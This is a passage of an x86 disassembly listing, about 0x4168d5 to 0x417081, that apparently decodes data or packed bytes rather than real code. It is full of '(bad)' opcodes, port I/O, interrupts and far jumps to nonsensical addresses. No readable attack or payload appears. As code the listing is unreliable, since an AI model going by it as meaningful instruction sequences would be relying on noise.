  4168d5:	or     bh,BYTE PTR [eax+0x9]
  4168d8:	mov    ebp,0xaef6ff9
  4168dd:	adc    eax,0xf5e1da54
  4168e2:	fild   WORD PTR [ebp-0x69]
  4168e5:	aam    0x59
  4168e7:	lahf   
  4168e8:	jp     0x416876
  4168ea:	push   eax
  4168eb:	(bad)
  4168ee:	iret   
  4168ef:	push   0x19
  4168f1:	ds (bad) 
  4168f3:	ss push cs
  4168f5:	scas   al,BYTE PTR es:[edi]
  4168f6:	mov    ebx,0x8a19e0af
  4168fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168fc:	imul   esp,DWORD PTR [edx+0x58d9583f],0xe1fc2445
  416906:	push   ds
  416907:	mov    ebp,0x1e7351fa
  41690c:	sahf   
  41690d:	sub    esi,ebp
  41690f:	jmp    0x2c42d637
  416914:	inc    ebp
  416915:	inc    eax
  416916:	or     al,0x64
  416918:	mov    dl,0x53
  41691a:	xchg   DWORD PTR [ebx+0x5d74d38c],ecx
  416920:	outs   dx,BYTE PTR ds:[esi]
  416921:	outs   dx,BYTE PTR ds:[esi]
  416922:	inc    ebx
  416923:	nop
  416924:	shl    BYTE PTR [ebx+0x5],1
  416927:	mov    esi,db7
  41692a:	dec    ebp
  41692b:	ins    DWORD PTR es:[edi],dx
  41692c:	xchg   esi,eax
  41692d:	shl    DWORD PTR [edi],0xb4
  416930:	scas   ax,WORD PTR es:[edi]
  416932:	fisttp DWORD PTR [esp+edi*4]
  416935:	sbb    al,0xb7
  416937:	push   edi
  416938:	jae    0x416975
  41693a:	int    0x4b
  41693c:	popf   
  41693d:	je     0x416920
  41693f:	push   edx
  416940:	push   ebp
  416941:	sbb    BYTE PTR [ecx+eiz*4+0x176c8966],dh
  416948:	pop    eax
  416949:	icebp  
  41694a:	sbb    dh,BYTE PTR [esi+ecx*8+0x60554703]
  416951:	add    al,0x2c
  416953:	jle    0x416973
  416955:	fcom   st(2)
  416957:	push   ss
  416958:	clc    
  416959:	dec    edi
  41695a:	fld    TBYTE PTR [edx+edi*1-0x4f]
  41695e:	xor    bh,BYTE PTR [eax+0x55]
  416961:	xlat   BYTE PTR ds:[ebx]
  416962:	dec    eax
  416963:	mov    eax,ds:0x32124f55
  416968:	mov    dh,0x35
  41696a:	les    edi,FWORD PTR [ecx+0x23aa6877]
  416970:	inc    ebx
  416971:	mov    ebp,0x1809ecad
  416976:	xchg   esp,eax
  416977:	push   edi
  416978:	add    eax,0x592f59f9
  41697d:	dec    ecx
  41697e:	repz inc ecx
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	cmp    dl,BYTE PTR [edx]
  416995:	test   eax,0x7f1fa5ba
  41699a:	jo     0x416955
  41699c:	jle    0x416a0e
  41699e:	jo     0x416930
  4169a0:	pop    ds
  4169a1:	jbe    0x41699e
  4169a3:	pop    esi
  4169a4:	dec    edi
  4169a5:	fsubp  st(0),st
  4169a7:	dec    ebx
  4169a8:	test   DWORD PTR [esi+ecx*8+0x7d34745d],ecx
  4169af:	pop    ss
  4169b0:	imul   edx,DWORD PTR [edx],0x47b62b96
  4169b6:	je     0x41693c
  4169b8:	xor    DWORD PTR [ecx-0x5f11e8d7],esi
  4169be:	and    BYTE PTR [edx],0x24
  4169c1:	cmp    eax,0xd0821f90
  4169c6:	xor    al,0xd9
  4169c8:	pop    ds
  4169c9:	dec    ebp
  4169ca:	repz xor ebp,ecx
  4169cd:	pop    esi
  4169ce:	popf   
  4169cf:	loop   0x416a48
  4169d1:	push   eax
  4169d2:	dec    edx
  4169d3:	ja     0x416a12
  4169d5:	bound  ecx,QWORD PTR [ebx-0x24]
  4169d8:	jmp    FWORD PTR [ecx]
  4169da:	sub    DWORD PTR [ecx+0x60a92cd6],esp
  4169e0:	stc    
  4169e1:	repnz sbb al,0x64
  4169e4:	push   ds
  4169e5:	push   ebx
  4169e6:	stos   BYTE PTR es:[edi],al
  4169e7:	shr    DWORD PTR [edx+edi*4+0x5f],1
  4169eb:	pop    eax
  4169ec:	mov    al,ds:0x5f429765
  4169f1:	jge    0x416978
  4169f3:	xchg   ebx,eax
  4169f4:	mov    ch,0x38
  4169f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169f7:	sub    al,0x2
  4169f9:	sub    BYTE PTR [eax+0x4e6f5645],ah
  4169ff:	jp     0x416a2f
  416a01:	mov    ebp,0x823ad682
  416a06:	cmp    ah,BYTE PTR [edx+0x70]
  416a09:	adc    BYTE PTR [edi],cl
  416a0b:	repnz or DWORD PTR [ebp+0xaeef992],edi
  416a12:	ja     0x416a05
  416a14:	cs lock es mov ch,0xf9
  416a19:	pusha  
  416a1a:	push   eax
  416a1b:	int    0xd4
  416a1d:	push   edx
  416a1e:	addr16 or bl,al
  416a21:	xchg   esi,eax
  416a22:	js     0x416a95
  416a24:	pop    es
  416a25:	stos   DWORD PTR es:[edi],eax
  416a26:	xchg   DWORD PTR [esi],edi
  416a28:	jg     0x416a9b
  416a2a:	mov    edx,0xd888fecd
  416a2f:	dec    edx
  416a30:	(bad)  
  416a31:	clc    
  416a32:	out    dx,eax
  416a33:	mov    ss,WORD PTR [eax]
  416a35:	ins    WORD PTR es:[edi],dx
  416a37:	vandnps ymm6,ymm5,YMMWORD PTR [ecx-0x4020c26c]
  416a3f:	fldenv [ebp+0x65]
  416a42:	popf   
  416a43:	or     ah,BYTE PTR [esi]
  416a45:	stos   BYTE PTR es:[edi],al
  416a46:	jbe    0x416a47
  416a48:	hlt    
  416a49:	(bad)  
  416a4a:	lds    edi,FWORD PTR [esi+0x1b]
  416a4d:	inc    ebp
  416a4e:	js     0x416a49
  416a50:	dec    eax
  416a51:	out    0x26,eax
  416a53:	and    eax,0xf021919b
  416a58:	scas   al,BYTE PTR es:[edi]
  416a59:	cli    
  416a5a:	test   DWORD PTR ds:0x93156969,ebp
  416a60:	add    ah,dl
  416a62:	std    
  416a63:	pop    eax
  416a64:	popf   
  416a65:	stos   DWORD PTR es:[edi],eax
  416a66:	pop    esi
  416a67:	push   edi
  416a68:	cmc    
  416a69:	add    al,0x84
  416a6b:	scas   eax,DWORD PTR es:[edi]
  416a6c:	and    al,0x52
  416a6f:	setge  al
  416a72:	xchg   ecx,eax
  416a73:	jecxz  0x416abd
  416a75:	add    ebp,0x5
  416a78:	sub    eax,0xc9b64420
  416a7d:	dec    edx
  416a7e:	push   ebp
  416a7f:	mov    ah,0xfb
  416a81:	or     eax,0x8a4a9a22
  416a86:	in     eax,0xb8
  416a88:	or     eax,esi
  416a8a:	xor    eax,0x59e00111
  416a8f:	push   ss
  416a90:	pop    ebp
  416a91:	xlat   BYTE PTR ds:[ebx]
  416a92:	xor    al,0x41
  416a94:	push   0x52d27e39
  416a99:	mov    ebx,0x4f6f7fbe
  416a9e:	data16 and BYTE PTR [esi+0x6f2046d6],bl
  416aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aa6:	fidivr WORD PTR es:[edx+0x68a97707]
  416aad:	fxch   st(5)
  416aaf:	fidiv  DWORD PTR gs:0x445dc7ca
  416ab6:	les    ebx,FWORD PTR [ebx+0x43f693e0]
  416abc:	sub    eax,edi
  416abe:	dec    ax
  416ac0:	mov    bl,0xe5
  416ac2:	mov    eax,ds:0xe93d3a9f
  416ac7:	xor    esp,DWORD PTR [ebp-0x207f7265]
  416acd:	mov    eax,0x5c385b02
  416ad2:	push   esp
  416ad3:	jge    0x416a55
  416ad5:	sub    esi,ebx
  416ad7:	fldenv [ebp+eax*1+0x73]
  416adb:	cwde   
  416adc:	outs   dx,BYTE PTR ds:[esi]
  416add:	pusha  
  416ade:	xor    dh,dl
  416ae0:	out    0x2b,eax
  416ae2:	rcr    BYTE PTR [ebp+esi*4-0xca6cdf1],cl
  416ae9:	dec    esp
  416aea:	jg     0x416b0f
  416aec:	mov    ebp,0x52d089ae
  416af1:	aas    
  416af2:	arpl   WORD PTR [ecx-0x3fa00dd5],bx
  416af8:	rcl    DWORD PTR [ebx-0x11e5ca9f],cl
  416afe:	outs   dx,BYTE PTR ds:[esi]
  416aff:	out    0x19,eax
  416b01:	jns    0x416b2e
  416b03:	mov    ch,0x31
  416b05:	shl    BYTE PTR [ebp+0x5571f9d4],cl
  416b0b:	cmp    ch,BYTE PTR [ebx+ebp*1+0x2688864]
  416b12:	mul    DWORD PTR [esi+0x1f2ea00f]
  416b18:	fisttp DWORD PTR [esi-0xc]
  416b1b:	stc    
  416b1c:	lods   al,BYTE PTR ds:[esi]
  416b1d:	dec    edx
  416b1e:	cmp    eax,0x1c2bad8c
  416b23:	add    BYTE PTR [esi+0x31b4ed61],bl
  416b29:	aaa    
  416b2a:	add    eax,0x5edb21a7
  416b2f:	or     DWORD PTR ds:0x97f94d61,esp
  416b35:	pop    edx
  416b36:	int3   
  416b37:	fild   QWORD PTR [eax-0x3bef7771]
  416b3d:	ficomp DWORD PTR [esi-0x5f]
  416b40:	shr    BYTE PTR [ebp+0x1ecb9f2],1
  416b46:	outs   dx,BYTE PTR ds:[esi]
  416b47:	aam    0xa6
  416b49:	aam    0xd4
  416b4b:	inc    esi
  416b4c:	in     eax,dx
  416b4d:	imul   edx
  416b4f:	loope  0x416b9c
  416b51:	pop    ebx
  416b52:	xchg   ecx,eax
  416b53:	std    
  416b54:	cmp    dh,BYTE PTR [edi+0x19fb9812]
  416b5a:	in     eax,0x6c
  416b5c:	cmp    cl,BYTE PTR [ebx]
  416b5e:	jle    0x416ba3
  416b60:	ret    0x1e85
  416b63:	mov    dh,0x84
  416b65:	ror    DWORD PTR [edx+edx*8-0x6a],0x8
  416b6a:	mov    ds,WORD PTR [edx]
  416b6c:	xor    DWORD PTR [esi],eax
  416b6e:	sbb    ebx,DWORD PTR ss:[esi]
  416b71:	and    DWORD PTR [ebp+0x5501ea59],eax
  416b77:	jp     0x416bf6
  416b79:	inc    ecx
  416b7a:	mov    dl,0x10
  416b7c:	fs pop ecx
  416b7e:	out    0x2c,al
  416b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b81:	enter  0x9232,0x8e
  416b85:	fcomp  QWORD PTR [edi-0x67327b3]
  416b8b:	stc    
  416b8c:	mov    es,esp
  416b8e:	aad    0x3b
  416b90:	xchg   BYTE PTR [edi],ah
  416b92:	(bad)  
  416b93:	dec    ebp
  416b94:	sbb    bp,WORD PTR [esp+esi*8]
  416b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b99:	adc    eax,0x76a1a651
  416b9e:	ror    DWORD PTR [eiz*1-0x1fa34e3e],cl
  416ba5:	ds pop ebx
  416ba7:	cmp    eax,DWORD PTR [edx+0x27]
  416baa:	push   ss
  416bab:	xlat   BYTE PTR ds:[ebx]
  416bac:	dec    esi
  416bad:	aas    
  416bae:	into   
  416baf:	inc    ch
  416bb1:	add    DWORD PTR [ecx+0x79],edx
  416bb4:	rcl    DWORD PTR [edi],0x15
  416bb7:	call   0x283c0ca2
  416bbc:	mov    BYTE PTR [edx-0x4ab8dabf],cl
  416bc2:	popa   
  416bc3:	inc    edx
  416bc4:	pop    esi
  416bc5:	dec    esp
  416bc6:	in     al,0x48
  416bc8:	add    ch,BYTE PTR [ebx]
  416bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bcb:	cmc    
  416bcc:	dec    ebx
  416bcd:	bound  ecx,QWORD PTR [edx+0x41]
  416bd0:	sbb    DWORD PTR [eax],ebp
  416bd2:	pop    ds
  416bd3:	xor    al,0xb0
  416bd5:	addr16 icebp 
  416bd7:	ficom  WORD PTR ds:0x8c886090
  416bdd:	xchg   ebx,eax
  416bde:	in     eax,dx
  416bdf:	mov    dh,0x9c
  416be1:	(bad)  [esi+0x244c673d]
  416be7:	mov    cl,BYTE PTR [edx]
  416be9:	mov    ah,0x28
  416beb:	adc    eax,0xa521a020
  416bf0:	ins    DWORD PTR es:[edi],dx
  416bf1:	inc    ebx
  416bf2:	hlt    
  416bf3:	jne    0x416c24
  416bf5:	scas   al,BYTE PTR es:[edi]
  416bf6:	jno    0x416b7a
  416bf8:	mov    edi,0xacb95d27
  416bfd:	jb     0x416c52
  416bff:	test   DWORD PTR [edi],eax
  416c01:	push   0x86a7294
  416c06:	out    0x15,eax
  416c08:	mov    ?,WORD PTR [edx-0x54]
  416c0b:	xor    BYTE PTR [edi],dh
  416c0d:	leave  
  416c0e:	pop    es
  416c0f:	or     ebx,DWORD PTR [ecx+edi*8]
  416c12:	xlat   BYTE PTR ds:[ebx]
  416c13:	jne    0x416c1c
  416c15:	adc    eax,0xd269082f
  416c1a:	mov    fs,WORD PTR [esi]
  416c1c:	das    
  416c1d:	xchg   edx,eax
  416c1e:	scas   al,BYTE PTR es:[edi]
  416c1f:	mov    esp,0xaeb0d30f
  416c24:	loopne 0x416c51
  416c26:	inc    edx
  416c27:	pop    eax
  416c28:	mov    edx,0xef47e706
  416c2d:	sar    DWORD PTR [ebx-0x63],cl
  416c30:	inc    edi
  416c31:	jbe    0x416c98
  416c33:	ins    BYTE PTR es:[edi],dx
  416c34:	sbb    DWORD PTR [ebx],ebx
  416c36:	lds    eax,FWORD PTR [edi]
  416c38:	(bad)  
  416c39:	xor    bh,BYTE PTR [edi-0x72]
  416c3c:	adc    ecx,DWORD PTR [eax+esi*2]
  416c3f:	nop    DWORD PTR [eax+eiz*1]
  416c43:	imul   ebx,DWORD PTR [esi+0x1a],0x6cb5ae4e
  416c4a:	retf   0x938b
  416c4d:	in     al,dx
  416c4e:	dec    eax
  416c4f:	ror    bl,1
  416c51:	cmp    al,0xc1
  416c53:	test   al,0xad
  416c56:	(bad)  
  416c57:	mov    bh,0x17
  416c59:	enter  0xb78,0x56
  416c5d:	or     eax,0x5f385f4b
  416c62:	imul   edx,DWORD PTR [esi],0x8b49faa2
  416c68:	inc    ebp
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	sar    BYTE PTR [ecx+0x72],1
  416c7e:	aas    
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c92
  416c88:	in     eax,0x31
  416c8a:	ins    BYTE PTR es:[edi],dx
  416c8b:	add    al,0xf1
  416c8d:	mov    cl,0xf
  416c8f:	sbb    edx,esi
  416c91:	push   0x69
  416c93:	dec    esi
  416c94:	xor    al,0x2d
  416c96:	jns    0x416c6a
  416c98:	test   DWORD PTR [edi+edx*4],eax
  416c9b:	jp     0x416cb1
  416c9d:	xchg   edx,eax
  416c9e:	repnz push eax
  416ca0:	gs loope 0x416c91
  416ca3:	retf   0x3589
  416ca6:	hlt    
  416ca7:	fild   QWORD PTR [esi-0x12]
  416caa:	sbb    al,0xaa
  416cac:	sub    edx,DWORD PTR [ecx-0x1fecec80]
  416cb2:	xor    DWORD PTR [esi-0x7b],ebx
  416cb5:	push   esp
  416cb6:	in     al,dx
  416cb7:	repz mov ?,WORD PTR [ecx]
  416cba:	out    dx,al
  416cbb:	and    BYTE PTR [ecx-0x5feda709],bl
  416cc1:	xchg   esi,eax
  416cc2:	iret   
  416cc3:	cli    
  416cc4:	inc    esp
  416cc5:	mov    eax,DWORD PTR [edi]
  416cc7:	sahf   
  416cc8:	out    dx,al
  416cc9:	call   0x4b33c05
  416cce:	fsubr  DWORD PTR [ecx]
  416cd0:	outs   dx,BYTE PTR ds:[esi]
  416cd1:	lock and al,0xe4
  416cd4:	mov    WORD PTR [ebx+0x4cd0fe2c],cs
  416cda:	mov    WORD PTR [ebx-0x4a],gs
  416cdd:	or     eax,0xde04fba8
  416ce2:	pop    ecx
  416ce3:	rcl    ah,1
  416ce5:	(bad)  
  416ce6:	int    0x6e
  416ce8:	sub    dl,bh
  416cea:	pop    es
  416ceb:	push   ss
  416cec:	push   esi
  416ced:	push   es
  416cee:	mov    edi,?
  416cf0:	adc    eax,0x4d8659aa
  416cf5:	int    0x58
  416cf7:	and    al,0x55
  416cf9:	mov    al,ds:0xe87b3ef6
  416cfe:	cwde   
  416cff:	jb     0x416d35
  416d01:	and    eax,0xaa74cd98
  416d06:	push   ebp
  416d07:	data16 test al,0x2d
  416d0a:	rcl    BYTE PTR [eax+0x3f066500],1
  416d10:	and    al,0x4a
  416d12:	stos   DWORD PTR es:[edi],eax
  416d13:	jmp    0x6fce7e67
  416d18:	(bad)  
  416d19:	clc    
  416d1a:	lds    edi,FWORD PTR [eax]
  416d1c:	xor    edx,ebp
  416d1e:	popa   
  416d1f:	sub    DWORD PTR [ecx+ebx*1+0xc],edi
  416d23:	into   
  416d24:	or     cl,ch
  416d26:	arpl   WORD PTR [edi-0x42],dx
  416d29:	(bad)  
  416d2a:	aam    0x4a
  416d2c:	sbb    eax,0x7f150991
  416d31:	push   0x7a6c10d2
  416d36:	imul   esi,DWORD PTR [ebx-0xbde05b],0xdf1b3f1e
  416d40:	into   
  416d41:	fsubr  DWORD PTR [ebx-0x29ab490]
  416d47:	ins    BYTE PTR es:[edi],dx
  416d48:	sbb    ecx,DWORD PTR [eax-0x5e]
  416d4b:	scas   al,BYTE PTR es:[edi]
  416d4c:	cmp    ah,BYTE PTR [eax]
  416d4e:	mov    eax,0xed6952d6
  416d53:	in     eax,dx
  416d54:	test   al,0x5f
  416d57:	mov    dh,BYTE PTR [ebx+esi*4]
  416d5a:	(bad)  
  416d5b:	and    edi,DWORD PTR [edi+0x52cffb62]
  416d61:	xbegin 0xb332abe3
  416d67:	mov    edi,0x7c9b77fc
  416d6c:	lahf   
  416d6d:	xchg   BYTE PTR [eax-0x5e],ah
  416d70:	jmp    0x416dda
  416d72:	cs inc edi
  416d74:	add    cl,BYTE PTR [ebx-0x26ecf339]
  416d7a:	add    BYTE PTR [edi-0x62771fd2],dh
  416d80:	das    
  416d81:	repz xor eax,0xfc5e2a8d
  416d87:	xchg   ecx,eax
  416d88:	and    DWORD PTR [eax+0x49],ebp
  416d8b:	cmp    bh,BYTE PTR ss:[ecx+edx*8+0x36]
  416d90:	inc    eax
  416d91:	or     bl,ch
  416d93:	or     al,0xde
  416d95:	fldenv [edx]
  416d97:	and    al,0xee
  416d99:	leave  
  416d9a:	and    al,0x1d
  416d9c:	pop    edx
  416d9d:	call   0xa370:0x5397fbec
  416da4:	daa    
  416da5:	add    eax,0x70e8c7ab
  416daa:	loop   0x416dcc
  416dac:	cdq    
  416dad:	ficomp DWORD PTR [eax+0x13]
  416db0:	jecxz  0x416d40
  416db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416db3:	jg     0x416d8f
  416db5:	dec    esp
  416db6:	in     eax,dx
  416db7:	inc    eax
  416db8:	aad    0xbf
  416dba:	arpl   WORD PTR [ecx+ebp*1-0x5a1b87e6],bp
  416dc1:	mov    WORD PTR [edi+esi*1+0x1d],?
  416dc5:	aad    0x9a
  416dc7:	retf   
  416dc8:	pop    edi
  416dc9:	lds    eax,FWORD PTR [ecx-0x6eaeee79]
  416dcf:	not    DWORD PTR [ecx-0x63139b15]
  416dd5:	mov    ebx,0x3f2d9af5
  416dda:	(bad)  
  416ddb:	pop    edx
  416ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ddd:	or     DWORD PTR [ebx+0x32],edx
  416de0:	inc    ecx
  416de1:	popa   
  416de2:	xchg   esi,eax
  416de3:	inc    ebp
  416de4:	cdq    
  416de5:	mov    edi,0xb86b645e
  416dea:	(bad)  
  416deb:	call   0xed3:0x2f15fcc0
  416df2:	or     eax,0x219405a4
  416df7:	xchg   esp,eax
  416df8:	scas   eax,DWORD PTR es:[edi]
  416df9:	inc    ebp
  416dfa:	mov    dh,0x7c
  416dfc:	cs and al,0xd
  416dff:	mov    ch,0xf0
  416e01:	lahf   
  416e02:	mov    ah,0x7d
  416e04:	jns    0x416d91
  416e06:	xor    dl,BYTE PTR [eax+edi*1]
  416e09:	or     al,BYTE PTR [edi+0xc]
  416e0c:	mov    edx,0x97e983db
  416e11:	mov    edi,0xee1032a
  416e16:	xchg   esi,eax
  416e17:	mov    al,0x8e
  416e19:	fmul   DWORD PTR [ebx]
  416e1b:	inc    ebp
  416e1c:	jns    0x416df3
  416e1e:	ss jmp 0x333f:0xe2496acb
  416e26:	sub    eax,0x7cb8e2b4
  416e2b:	mov    ds:0xdc49188e,eax
  416e30:	out    dx,al
  416e31:	popa   
  416e32:	xor    BYTE PTR [eax-0x23359c2f],0x85
  416e39:	xor    ecx,esi
  416e3b:	sbb    dl,bh
  416e3d:	mov    ds:0xbbec09a8,eax
  416e42:	rcl    DWORD PTR [edi],0x31
  416e45:	inc    eax
  416e46:	cmp    ch,ch
  416e48:	cmp    eax,0x18ce2f60
  416e4d:	es out 0xcc,al
  416e50:	sub    dh,bl
  416e52:	sub    ebp,DWORD PTR [ebp+0x43]
  416e55:	pop    edi
  416e56:	jae    0x416ddb
  416e58:	je     0x416eae
  416e5a:	arpl   WORD PTR [edi-0x45862891],sp
  416e60:	push   edx
  416e61:	aaa    
  416e62:	push   0xffffff81
  416e64:	add    BYTE PTR [esi],bh
  416e66:	cdq    
  416e67:	repz mov ebp,0xdfb28b97
  416e6d:	jbe    0x416e51
  416e6f:	mov    WORD PTR [edi],cs
  416e71:	imul   esi,DWORD PTR [ecx+0x697a16b2],0x3e
  416e78:	loop   0x416ebb
  416e7a:	mov    esp,eax
  416e7c:	pop    eax
  416e7d:	sbb    al,0x73
  416e7f:	push   ds
  416e80:	adc    BYTE PTR [edi+0x2d],al
  416e83:	leave  
  416e84:	pop    ss
  416e85:	and    al,0xe
  416e87:	daa    
  416e88:	fcomp  DWORD PTR [ebx+eiz*2-0x1c777609]
  416e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e90:	leave  
  416e91:	sub    esp,DWORD PTR [ebx]
  416e93:	fwait
  416e94:	hlt    
  416e95:	fwait
  416e96:	jp     0x416e4a
  416e98:	imul   ebx,DWORD PTR [esi],0x1c
  416e9b:	mov    cs,WORD PTR [eax-0x7b]
  416e9e:	pop    edx
  416e9f:	into   
  416ea0:	std    
  416ea1:	dec    esi
  416ea2:	add    DWORD PTR [edi-0x15],esp
  416ea5:	and    dh,BYTE PTR ds:0x249a53bf
  416eab:	sbb    DWORD PTR [edi],ebx
  416ead:	xchg   edi,eax
  416eae:	out    0x70,eax
  416eb0:	mov    eax,ds:0x2644d745
  416eb5:	(bad)  
  416eb6:	iret   
  416eb7:	sub    ebp,0x58004769
  416ebd:	ds aaa 
  416ebf:	and    eax,0x2fba4cda
  416ec4:	sbb    dl,ch
  416ec6:	sbb    BYTE PTR [esi],al
  416ec8:	or     BYTE PTR [eax+0x4d],ah
  416ecb:	(bad)  
  416ecc:	pop    ecx
  416ecd:	popa   
  416ece:	stos   DWORD PTR es:[edi],eax
  416ecf:	add    al,0xf8
  416ed1:	js     0x416e91
  416ed3:	dec    edi
  416ed4:	dec    esi
  416ed5:	(bad)  
  416ed6:	push   eax
  416ed7:	std    
  416ed8:	sti    
  416ed9:	sbb    ebx,edx
  416edb:	cmp    bl,BYTE PTR [ebp+ecx*1-0x54]
  416edf:	enter  0xaf3e,0x3e
  416ee3:	push   esi
  416ee4:	into   
  416ee5:	fcom   QWORD PTR [ecx+0x13]
  416ee8:	bound  ecx,QWORD PTR [eax+ecx*1+0x82f8927]
  416eef:	push   esi
  416ef0:	into   
  416ef1:	xor    eax,0xd1a031e8
  416ef6:	out    dx,eax
  416ef7:	loop   0x416f35
  416ef9:	mov    ebx,0x8f44b2e9
  416efe:	sahf   
  416eff:	or     al,0x6b
  416f01:	test   edx,esp
  416f03:	sar    BYTE PTR [esi+0x5],1
  416f06:	cwde   
  416f07:	es addr16 mov ebx,0x3acb5935
  416f0e:	je     0x416f80
  416f10:	xlat   BYTE PTR ds:[ebx]
  416f11:	stos   BYTE PTR es:[edi],al
  416f12:	mov    dl,0x43
  416f14:	jae    0x416eb0
  416f16:	shl    ch,0x1e
  416f19:	or     DWORD PTR [ebp-0x7955c384],edx
  416f1f:	jmp    FWORD PTR [edi-0x3c]
  416f22:	int    0xd5
  416f24:	retf   0x98c6
  416f27:	push   ss
  416f28:	inc    ebx
  416f29:	(bad)  
  416f2a:	out    dx,al
  416f2b:	xor    esi,DWORD PTR [eax-0x3e]
  416f2e:	pushf  
  416f2f:	jl     0x416ed1
  416f31:	push   esp
  416f32:	test   DWORD PTR [esp+eiz*2-0x69dcd7cd],ebp
  416f39:	xor    edi,DWORD PTR [esi-0x3bd0ff79]
  416f3f:	in     al,0xd5
  416f41:	out    0x56,eax
  416f43:	arpl   WORD PTR [eax-0x38],bp
  416f46:	call   0xae74:0x30f7d795
  416f4d:	fisttp DWORD PTR [edi]
  416f4f:	scas   eax,DWORD PTR es:[edi]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	neg    DWORD PTR [edx]
  416f6c:	aam    0x4
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0x6670707e
  416f77:	cmp    DWORD PTR [esi],ebp
  416f79:	dec    eax
  416f7a:	sbb    dl,ah
  416f7c:	pop    edi
  416f7d:	pop    edx
  416f7e:	ret    0x7081
  416f81:	fld    QWORD PTR [ebx-0x35f7925]
  416f87:	in     al,0x97
  416f89:	dec    DWORD PTR [eax+0x3a82c88c]
  416f8f:	adc    edx,DWORD PTR [ecx-0x2e]
  416f92:	mov    eax,ds:0x6f17c030
  416f97:	jae    0x416f9d
  416f99:	add    al,0x2c
  416f9b:	mov    BYTE PTR [edx+0x7cd68c2a],0x89
  416fa2:	fwait
  416fa3:	cmp    bh,ch
  416fa5:	aam    0xb2
  416fa7:	mov    al,0x56
  416fa9:	int    0x61
  416fab:	ss mov edx,0xef6ad342
  416fb1:	dec    eax
  416fb2:	pop    ss
  416fb3:	sbb    al,0x91
  416fb5:	jno    0x416f43
  416fb7:	pop    edi
  416fb8:	lods   al,BYTE PTR ds:[esi]
  416fb9:	xchg   BYTE PTR [edi+0x7592b479],al
  416fbf:	cmp    cl,BYTE PTR [esi-0x27]
  416fc2:	lea    eax,[ebx+ecx*1+0x2bc3af6a]
  416fc9:	jb     0x416f5c
  416fcb:	mov    ebp,0xd613f312
  416fd0:	jmp    0x417010
  416fd2:	es out 0x6d,al
  416fd5:	ins    DWORD PTR es:[edi],dx
  416fd6:	dec    esi
  416fd7:	cmp    BYTE PTR [esi-0x70],0x93
  416fdb:	ret    0xd905
  416fde:	aas    
  416fdf:	xlat   BYTE PTR ds:[ebx]
  416fe0:	aas    
  416fe1:	xchg   edi,eax
  416fe2:	pop    ss
  416fe3:	shr    DWORD PTR [ebp-0x7598f41c],1
  416fe9:	faddp  st(7),st
  416feb:	aas    
  416fec:	adc    esi,DWORD PTR [esi]
  416fee:	enter  0x4446,0x38
  416ff2:	inc    ecx
  416ff3:	mov    ebx,0x6e828307
  416ff8:	repnz and ebp,DWORD PTR [ebx-0x52]
  416ffc:	jmp    0x1570:0x3fbc4fd6
  417003:	xchg   DWORD PTR [esi-0x60],edi
  417006:	je     0x41706a
  417008:	pop    esp
  417009:	test   BYTE PTR [esi+esi*4],cl
  41700c:	mov    esi,0xd07c3f66
  417011:	adc    DWORD PTR [eax+esi*4],ecx
  417014:	jmp    0x70b7:0x5c0373be
  41701b:	xor    BYTE PTR [ebx-0x41e15d21],0xbf
  417022:	stos   BYTE PTR es:[edi],al
  417023:	pop    ebx
  417024:	sbb    eax,0x128930c2
  417029:	into   
  41702a:	in     al,0xf6
  41702c:	outs   dx,BYTE PTR ds:[esi]
  41702d:	arpl   WORD PTR [ebp+0x15aad90f],bp
  417033:	outs   dx,DWORD PTR ds:[esi]
  417034:	inc    esi
  417035:	sub    BYTE PTR [ebp-0x654da728],dh
  41703b:	fld    QWORD PTR [esi+0x63dcd9cc]
  417041:	add    al,0x52
  417043:	jge    0x41702b
  417045:	push   ebp
  417046:	popa   
  417047:	adc    BYTE PTR [esi+0x11751269],dh
  41704d:	retf   
  41704e:	dec    esi
  41704f:	shr    DWORD PTR [eax-0x519b52e2],0x57
  417056:	push   edi
  417057:	fld    QWORD PTR [eax+0x26]
  41705a:	lods   al,BYTE PTR ds:[esi]
  41705b:	mov    BYTE PTR [esi],ch
  41705d:	aas    
  41705e:	bound  edi,QWORD PTR [edi]
  417060:	outs   dx,BYTE PTR ds:[esi]
  417061:	pushf  
  417062:	arpl   WORD PTR ds:0xb0eaf92,dx
  417068:	dec    ecx
  417069:	mul    DWORD PTR [edx]
  41706b:	jnp    0x41700a
  41706d:	loopne 0x417010
  41706f:	jecxz  0x41700c
  417071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417072:	(bad)  
  417073:	imul   edi,DWORD PTR [edi-0x50],0xffffff85
  417077:	aas    
  417078:	mov    dh,0x72
  41707a:	ins    BYTE PTR es:[edi],dx
  41707b:	nop
  41707c:	imul   esi,DWORD PTR [eax],0xffffffdf
  41707f:	out    0x7f,eax
  417081:	cmp    al,0x78
